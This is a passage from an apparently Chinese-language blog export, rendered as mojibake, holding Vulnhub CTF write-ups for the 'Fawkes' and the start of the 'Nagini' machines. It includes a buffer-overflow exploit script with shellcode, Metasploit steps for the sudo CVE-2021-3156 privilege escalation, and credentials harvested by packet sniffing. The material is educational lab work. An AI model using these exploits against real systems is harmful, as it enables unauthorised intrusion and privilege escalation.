class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š</p>
<ul>
<li>æœ€å¼€å§‹çš„<code>#! /usr/bin/python</code>ï¼šå½“æˆ‘ä»¬è¾“å…¥<code>./exp.py</code>æ—¶ï¼Œé»˜è®¤æœ€å¼€å§‹<code>#!</code>ä¸­çš„æ‰§è¡Œï¼›</li>
<li><code>'\x90'*32*</code>ï¼š<code>\x90</code>ç©ºï¼Œè¯»åˆ°è¯¥å­—èŠ‚å°±ä¼šç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªã€‚è¿™æ˜¯ä¸€ä¸ªæŠ€å·§ï¼Œä½¿ç¨‹åºæ›´ç¨³å®šã€‚å¦‚æœä»£ç çš„å­—èŠ‚å¾ˆç´§å‡‘ï¼Œå¯èƒ½æ‰§è¡Œè¿‡ç¨‹ä¸ä¼šæŒ‰ç…§é¢„æœŸï¼Œé€‚å½“çš„æ’å…¥nullä¸ä¼šå½±å“æ‰§è¡Œè¿‡ç¨‹ï¼Œåè€Œèƒ½å¤Ÿä½¿ç¨‹åºçš„è¿è¡Œæ›´åŠ ç¨³å®šã€‚</li>
<li>ä¸èƒ½ç”¨python3ï¼Œå¦åˆ™ä¼šå› ä¸ºpayloadä¸­æ—¢æœ‰å­—èŠ‚åˆæœ‰å­—ç¬¦è€ŒæŠ¥é”™ï¼</li>
</ul>
<p>æ¥ç€ï¼š</p>
<ol type="1">
<li>å¯åŠ¨æœåŠ¡</li>
<li>ç›‘å¬4444ç«¯å£</li>
<li>æ‰§è¡Œè¯¥ç¨‹åº<code>./exp.py</code>æˆ–è€…<code>python exp.py</code>éƒ½å¯ä»¥ï¼Œä¸è¿‡ä¸€å®šè¦ç¡®ä¿æœåŠ¡å¼€å¯</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
<p>æ¥ä¸‹æ¥ä¿®æ”¹è„šæœ¬ï¼Œå°†IPåœ°å€æ”¹ä¸º<code>10.0.2.16</code>å³å¯ï¼Œç„¶åæ‰§è¡Œè¯¥è„šæœ¬ï¼Œè®²é“ç†å°±èƒ½å¤Ÿè·å¾—é¶æœºçš„shellã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
<h2 id="ä¿¡æ¯æ”¶é›†">2.5 ä¿¡æ¯æ”¶é›†</h2>
<p>è¾“å…¥<code>/bin/sh -i</code>æ‹¿åˆ°å¯ç”¨çš„shellã€‚è¦åŠ `-iã€‚</p>
<p>å½“æˆ‘å‘ç°è¯¥shellçš„IPæ—¶å¯Ÿè§‰åˆ°ä¸å¯¹åŠ²</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
<p>é¶æœºçš„IPåº”è¯¥æ˜¯<code>10.0.2.16</code>è€Œä¸æ˜¯<code>172.....</code>ï¼Œå¹¶ä¸”ç½‘å¡çš„åå­—ä¹Ÿå¾ˆå¥‡æ€ªï¼Œæ€€ç–‘è¿™å¯èƒ½æ˜¯ä¸€ä¸ªå®¹å™¨ï¼ŒæŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
<p>ç¡®å®šäº†æˆ‘ä»¬ç°åœ¨çš„shellæ˜¯ä¸€ä¸ªå®¹å™¨çš„shellã€‚ä¸ç®¡å®ƒï¼Œåæ­£å…ˆæ”¶é›†ä¿¡æ¯å°±å¯¹äº†ã€‚</p>
<p>é¦–å…ˆï¼Œåœ¨å½“å‰ç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªå¯èƒ½æ˜¯é‡è¦çš„æ–‡ä»¶<code>.mycreds.txt</code>ï¼ŒæŸ¥çœ‹å…¶å†…å®¹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
<p>è¿™çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªå¯†ç ï¼Œä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€ï¼Œå…ˆå°è¯•ä¸€ä¸‹sshç™»å½•ï¼Œä¸¤ä¸ªç«¯å£çš„sshéƒ½å°è¯•ä¸€ä¸‹ï¼Œå‘ç°2222ç«¯å£çš„ç™»å½•æˆåŠŸäº† <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°è¿˜æ˜¯åœ¨å®¹å™¨å†…ğŸ¤¡ï¼ŒæŸ¥çœ‹ä¸€ä¸‹rootç›®å½•é‡Œé¢çš„å†…å®¹ï¼Œå‘ç°äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œå†…å®¹åˆ†åˆ«ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # è¿™å°±æ˜¯ç¬¬ä¸€ä¸ªflagï¼Œhorcruxæ˜¯å“ˆåˆ©æ³¢ç‰¹é‡Œé¢çš„é­‚å™¨çš„æ„æ€</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
<p>base64è§£ç ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
<p>éœ€è¦å…³æ³¨çš„æ˜¯<code>note.txt</code>ä¸­çš„å†…å®¹ï¼Œå¤§è‡´çš„æ„æ€æ˜¯ï¼šæœ‰äººå°è¯•ç™»å½•ftpæœåŠ¡å™¨ï¼Œä½†æ˜¯å‡ºé”™äº†ï¼Œè¦æ±‚æˆ‘ä»¬ç”¨æµé‡åˆ†æçš„æ–¹æ³•æ‰¾åˆ°é‚£äººæ˜¯è°ã€‚</p>
<p>åˆ©ç”¨å·¥å…·<code>tcpdump</code>åˆ†ææµé‡ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># åˆ‡æ¢åˆ°root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
<p>è¿‡äº†ä¸€ä¼šå¼€å§‹æœ‰äº†æ•°æ®åŒ…ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
<p>å‰é¢çš„3ä¸ªä¸ºtcpæ¡æ‰‹è¿‡ç¨‹ï¼Œæ³¨æ„çº¢æ¡†ä¸­çš„ä¿¡æ¯ï¼š</p>
<ul>
<li>ç¬¬ä¸€ä¸ªçº¢æ¡†ï¼šftpçš„è¯­æ³•ï¼ŒUSERåé¢è·Ÿçš„æ˜¯è¦ç™»å½•çš„ç”¨æˆ·å</li>
<li>ç¬¬äºŒä¸ªçº¢æ¡†ï¼šæœåŠ¡å™¨è¦æ±‚å¯¹æ–¹è¾“å…¥å¯†ç </li>
<li>ç¬¬ä¸‰ä¸ªçº¢æ¡†ï¼šftpè¯­æ³•ï¼ŒPASSåé¢è·Ÿçš„æ˜¯å¯†ç </li>
<li>ç¬¬å››ä¸ªçº¢æ¡†ï¼šç™»é™†å¤±è´¥</li>
</ul>
<p>åˆè·å¾—ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
<p>å°è¯•ç™»å½•å¦ä¸€ä¸ªç«¯å£çš„ssh</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
<p>ç™»å½•æˆåŠŸï¼Œå¹¶ä¸”æˆåŠŸæ¥åˆ°çœŸå®çš„é¶æœºã€‚</p>
<h2 id="æƒé™æå‡">2.6 æƒé™æå‡</h2>
<p>è¿™æ¬¡é¶æœºçš„ææƒæ¶‰åŠåˆ°ä¸€ä¸ªæ¼æ´<code>CVE-2021-3156</code>ï¼Œå‚è€ƒèµ„æ–™åœ¨[[#é¶æœºä¿¡æ¯]]ä¸­ç»™å‡ºã€‚msfä¸­ä¹Ÿå­˜åœ¨å¯åˆ©ç”¨çš„ä»£ç ã€‚</p>
<p>é¦–å…ˆï¼Œå…ˆåˆ©ç”¨msfä¸­çš„auxiliaryæ¨¡å—ç™»å½•sshåˆ›å»ºä¸€ä¸ªä¼šè¯ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole <span class="comment"># æ‰“å¼€msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
<p>ç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯æç¤ºå¤±è´¥äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
<p>å‘½åå­˜åœ¨è¯¥æ¼æ´ï¼Œä½†æ˜¯å´å¤±è´¥äº†è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ã€‚é€šè¿‡ä¸‹è½½<a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>ä¸­çš„<code>expoit_nss.py</code>ï¼ŒæŸ¥çœ‹å…¶ä¸­æºç ï¼ˆåªåˆ—å‡ºéƒ¨åˆ†ï¼‰ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„å…¶ä¸­çš„<code>SUDO_PATH</code>ï¼Œæˆ‘ä»¬æŸ¥çœ‹é¶æœºä¸Šsudoçš„è·¯å¾„å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
<p>æ‰€ä»¥éœ€è¦ä¿®æ”¹ï¼Œç„¶åexpå°±å¯ä»¥æˆåŠŸåˆ©ç”¨äº†ã€‚å°†ä¿®æ”¹ä¹‹åçš„æ–‡ä»¶ä¼ ç»™é¶æœº <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">é¶æœº: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
<p>ææƒæˆåŠŸï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
<p>æ¥ç€å°±å¯ä»¥æŸ¥çœ‹å‰©ä¸‹çš„ä¸¤ä¸ªflagäº†ï¼Œä¸€ä¸ªåœ¨<code>/home/nevile/horcrux2.txt</code>ï¼Œè¿˜æœ‰ä¸€ä¸ªåœ¨<code>/root/horcrux3.txt</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<p>å°†å…¶ä¸­çš„base64ç¼–ç çš„éƒ¨åˆ†è§£ç å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
<h1 id="æ€»ç»“">3 æ€»ç»“</h1>
<p>è¯¥é¶æœºçš„éš¾åº¦ä¸ºé«˜ï¼Œæˆ‘è®¤ä¸ºä¸»è¦æ˜¯æ¶‰åŠäº†è®¸å¤šå…³äºäºŒè¿›åˆ¶çš„æ¸—é€æ–¹æ³•ï¼Œå…¶ä»–æ”»å‡»æ–¹æ³•è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚</p>
<p>å…¶æ¬¡ï¼Œè¿˜æ¶‰åŠäº†ä¹‹å‰æ²¡æœ‰çš„FTPæœåŠ¡æ”»å‡»æŠ€æœ¯ã€‚</p>
<p>æœ€åï¼Œé€šè¿‡æŠ“åŒ…åˆ†æå¾—åˆ°sshç”¨æˆ·åå’Œå¯†ç ä¹Ÿæ˜¯éå¸¸æ–°é¢–çš„ã€‚</p>
<h2 id="aslræŠ€æœ¯">3.1 ASLRæŠ€æœ¯</h2>
<p>ASLRï¼ˆAddress Space Layout Randomizationï¼Œåœ°å€ç©ºé—´éšæœºåŒ–ï¼‰æŠ€æœ¯é€šè¿‡åŠ è½½ç¨‹åºçš„æ—¶å€™ä½¿ç”¨ä¸å›ºå®šçš„åŸºå€åŠ è½½ï¼Œä»è€Œå¹²æ‰°shellcodeå®šä½çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚</p>
<p>éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>å®ƒå¹¶ä¸èƒ½è§£å†³æ¼æ´ï¼Œè€Œæ˜¯å¢åŠ äº†åˆ©ç”¨æ¼æ´çš„éš¾åº¦ï¼›</li>
<li>å®ƒä¸è¿½è¸ªæˆ–æŠ¥å‘Šæ¼æ´</li>
<li>ä¸èƒ½å¯¹ç¼–è¯‘æ—¶æ²¡æœ‰å¼€å¯ASLRæ”¯æŒçš„äºŒè¿›åˆ¶æ–‡ä»¶æä¾›ä¿æŠ¤</li>
<li>ä¸èƒ½é¿å…è¢«ç»•è¿‡</li>
</ul>
<p>é€šè¿‡å¯¹æ”»å‡»è€…åœ¨è¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ—¶æ‰€è¦ç”¨åˆ°çš„å†…å­˜å¸ƒå±€ä¸­çš„åç§»åšäº†éšæœºåŒ–ï¼ŒASLR åŠ å¤§äº†æ”»å‡»æˆåŠŸçš„éš¾åº¦ï¼Œä»è€Œå¢å¼ºäº†ç³»ç»Ÿçš„æ§åˆ¶æµå®Œæ•´æ€§ã€‚</p>
<p>åœ¨Linuxä¸­å¯ä»¥é€šè¿‡ä¸‹é¢ä¸¤æ¡å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å¼€å¯è¯¥åŠŸèƒ½ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
<p><code>randomize_va_space</code>çš„å€¼æœ‰ä¸‰ä¸ªï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>FTPæœåŠ¡æ”»å‡»</tag>
        <tag>æµé‡æŠ“åŒ…åˆ†æ</tag>
        <tag>å †æº¢å‡ºæ¼æ´æ”»å‡»:CVE-2021-3156</tag>
        <tag>ç¼“å†²åŒºæº¢å‡ºæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>14 Vulnhub Nagini Writeup</title>
    <url>/2022/04/22/14%20Vulnhub%20Nagini%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦æ¯”è¾ƒé«˜ï¼Œæœ‰è®¸å¤šçŸ¥è¯†ç‚¹ä¹‹å‰æ²¡æœ‰æ¶‰åŠè¿‡ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">HarryPotter: Nagini ~ VulnHub</a></li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ä¸­ã€é«˜éš¾åº¦</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å–å¾—rootæƒé™</li>
<li>æ‹¿åˆ°3ä¸ªflag</li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†</li>
<li><strong>HTTP3åè®®</strong></li>
<li>åŸŸåç»‘å®š</li>
<li><strong>SSRFæ¼æ´</strong>ï¼ˆGopher+MySQLï¼‰</li>
<li>Joomlaæ¼æ´</li>
<li>SSHå…¬é’¥ç™»å½•</li>
<li><strong>æµè§ˆå™¨å¯†ç è¿˜åŸ</strong></li>
</ul>
<h1 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h1>
<h2 id="gopheråè®®">Gopheråè®®</h2>
<p><a href="Gopheråè®®.md">Gopheråè®®</a></p>
<h2 id="http3åè®®">HTTP3åè®®</h2>
<p><a href="HTTP3åè®®.md">HTTP3åè®®</a></p>
<h2 id="ssrfæ¼æ´">SSRFæ¼æ´</h2>
<p><a href="SSRF.md">SSRF</a></p>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>kali: 10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.22</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.22</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170113.png" /></p>
<p>ä¿¡æ¯ï¼š</p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œç‰ˆæœ¬ä¸ºApache 2.4.38</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºDebian</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>ç›´æ¥è®¿é—®80ç«¯å£ï¼Œå‘ç°ç½‘é¡µéå¸¸çš„å¹²å‡€ï¼Œåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½ä½¿ç”¨è·¯å¾„æ‰«æã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯dirsearchæ‰«æçš„ä¸å…¨ï¼Œè¦ä¹ˆè‡ªå·±æŒ‡å®šå­—å…¸ï¼Œæˆ–è€…å°±æ˜¯é…åˆgobusterä¸€èµ·ä½¿ç”¨ã€‚</p>
<p>åˆ©ç”¨dirsearchæ‰«æå‡ºäº†ä¸¤ä¸ªï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">/joomla/</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥å¯¹åè€…ç»§ç»­è¿›è¡Œæ‰«æï¼Œä¼šæ‰«å‡ºå¾ˆå¤šä¸œè¥¿ã€‚åè€…å…¶å®æ˜¯ä¸€ä¸ªå¼€æºçš„CMSï¼Œå¯ä»¥åœ¨GitHubä¸Šæ‰¾åˆ°æºç ï¼š<a href="https://github.com/joomla/joomla-cms">GitHub - joomla/joomla-cms: Home of the Joomla! Content Management System</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170617.png" /></p>
<p>é‡è¦çš„å…¶å®æ˜¯è¿™ä¸ªï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œå¾—åˆ°è®¸å¤šé…ç½®ä¿¡æ¯ï¼ˆç›´æ¥å°†.bakåç¼€åˆ æ‰å°±å¯ä»¥æ‰“å¼€äº†ï¼‰ï¼Œé‡è¦çš„æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170925.png" /></p>
<p>å› æ­¤å¯ä»¥çŸ¥é“é¶æœºä¸Šå­˜åœ¨ç€MySQLæ•°æ®åº“ï¼Œå¹¶ä¸”ç”¨æˆ·åå’Œæ•°æ®åº“éƒ½å†™åœ¨è¿™é‡Œé¢äº†ã€‚è¿™äº›ä¿¡æ¯åé¢ç”¨åˆ°ã€‚</p>
<p>åæ¥æˆ‘å°±å°è¯•è®¿é—®äº†ä¸‹æ‰«æå‡ºæ¥çš„è·¯å¾„ï¼Œå¾—åˆ°ä¸¤ä¸ªç™»é™†ç•Œé¢ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ™®é€šç”¨æˆ·ç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171108.png" /></p>
<p>ç¬¬äºŒä¸ªæ˜¯åå°ç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171121.png" /></p>
<p>åŸæœ¬ä»¥ä¸ºæ˜¯åˆ©ç”¨å¼€æºCMSçš„æ¼æ´æ¥è·å¾—shellï¼Œäºæ˜¯åˆ©ç”¨msfæŸ¥çœ‹äº†é¶æœºä¸Šjoomlaçš„ç‰ˆæœ¬ï¼Œæœ€åç¡®å®šæ˜¯3.9.25ï¼Œä¹Ÿå°±æ˜¯ä¸å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚é»˜è®¤çš„è´¦å·å’Œå¯†ç ä¹Ÿä¸èƒ½å¤Ÿç™»å½•ã€‚ä¸‡èˆ¬æ— å¥ˆä¹‹ä¸‹ï¼Œå°è¯•ç”¨gobusterå†æ¬¡æ‰«æï¼Œè¿™å›å¾—åˆ°äº†ä¸€ä¸ªæ–‡ä»¶note.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.22/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<hr />
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.43 -f -e html,php,txt -w [å­—å…¸åœ°å€]</span><br></pre></td></tr></table></figure></p>
<p>æŒ‡å®šå­—å…¸ï¼Œæ•ˆæœæœ‰æ—¶å€™ä¼šæ¯”ä¸å¸¦å­—å…¸å¥½ï¼Œä½†æ˜¯é€Ÿåº¦æ…¢ã€‚</p>
<hr />
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171543.png" /></p>
<p>è®¿é—®è¯¥æ–‡ä»¶å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171621.png" /></p>
<p>è¦æ±‚æˆ‘ä»¬è®¿é—®HTTP3çš„æœåŠ¡ç«¯ï¼Œå¹¶ä¸”ç»™å‡ºäº†åŸŸåã€‚</p>
<h2 id="åŸŸåç»‘å®šå’Œhttp3åè®®">åŸŸåç»‘å®šå’ŒHTTP3åè®®</h2>
<h3 id="åŸŸåç»‘å®š">åŸŸåç»‘å®š</h3>
<p>è¿™å°é¶æœºé€šè¿‡ä¸Šæœ‰å¤šä¸ªWebåº”ç”¨ï¼Œä½†æ˜¯ç«¯å£éƒ½æ˜¯åœ¨80ç«¯å£ï¼Œå› æ­¤æ¨æµ‹é€šè¿‡è®¿é—®ä¸åŒçš„åŸŸåå¯ä»¥è®¿é—®åˆ°è¯¥é¶æœºä¸Šä¸åŒçš„Webåº”ç”¨ã€‚å› æ­¤ï¼Œéœ€è¦å…ˆè¿›è¡ŒåŸŸåç»‘å®šã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171902.png" /></p>
<p>æ­¤æ—¶è¿˜ä¸èƒ½è®¿é—®ï¼Œå› ä¸ºè¯¥åŸŸåçš„ä½¿ç”¨çš„æ˜¯HTTP3åè®®ï¼Œå› æ­¤éœ€è¦å…ˆä¸‹è½½HTTP3åè®®å·¥å…·ã€‚</p>
<h3 id="http3åè®®å·¥å…·">HTTP3åè®®å·¥å…·</h3>
<blockquote>
<p>éœ€è¦æå‰å®‰è£…carrgo, cmake</p>
</blockquote>
<p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/cloudflare/quiche">GitHub - cloudflare/quiche: ğŸ¥§ Savoury implementation of the QUIC transport protocol and HTTP/3</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/cloudflare/quiche</span><br><span class="line">cargo build --examples  <span class="comment"># éœ€è¦è¿›å…¥åˆ°quicheç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> quiche/target/debug/examples</span><br><span class="line">./http3-client https://quic.nagini.hogwarts æˆ–è€… ./http3-client https://10.0.2.22</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>
